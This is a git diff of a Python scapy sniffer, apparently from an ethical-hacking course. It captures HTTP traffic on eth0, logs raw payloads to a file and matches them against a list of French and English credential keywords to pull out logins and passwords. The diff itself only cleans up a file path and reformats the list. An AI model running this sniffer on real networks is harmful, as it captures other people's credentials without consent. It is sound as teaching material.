@@ -13,7 +13,6 @@ def process_packets(packet): #on va voir si notre packet a le layer http, on va 
 		print(colored(url, 'magenta'))
 		if packet.haslayer(scapy.Raw): #les username and password st dans load qui est dans raw
 			load = packet[scapy.Raw].load
-			#print("load: " + str(load))
 			loadfile.write(str(load) + '\n')
 			for i in words:
 				if i in str(load): #on cherche les words qu'on a choisis
@@ -21,6 +20,9 @@ def process_packets(packet): #on va voir si notre packet a le layer http, on va 
 					break #quite la loop
 
 global loadfile
-loadfile = open('/home/kamui/Documents/Ethical hacking course/Section 2/localnetworkprograms/loadfile.txt','a')
-words = ["Login", "log in", "Log in", "Pseudo", "pseudo", "Identifiants", "identifiants", "identifiant", "Identifiant", "Mot de passe", "mot de passe", "mdp", "ID", "Id", "id", "email", "mail", "adresse mail", "usr", "pwd", "User name:", "User name", "Password:", "password:", "Password :", "Username:", "Username :", "password", "user", "username", "login", "pass", "User", "Password"] #les mots qu'on attend dans la partie load
+loadfile = open('./loadfile.txt','a')
+#mots pour détecter un login
+words = ["Login", "log in", "Log in", "Pseudo", "pseudo", "Identifiants", "identifiants", "identifiant", "Identifiant", "Mot de passe",
+		"mot de passe", "mdp", "ID", "Id", "id", "email", "mail", "adresse mail", "usr", "pwd", "User name:", "User name", "Password:", "password:",
+		"Password :", "Username:", "Username :", "password", "user", "username", "login", "pass", "User", "Password"]
 sniff("eth0")
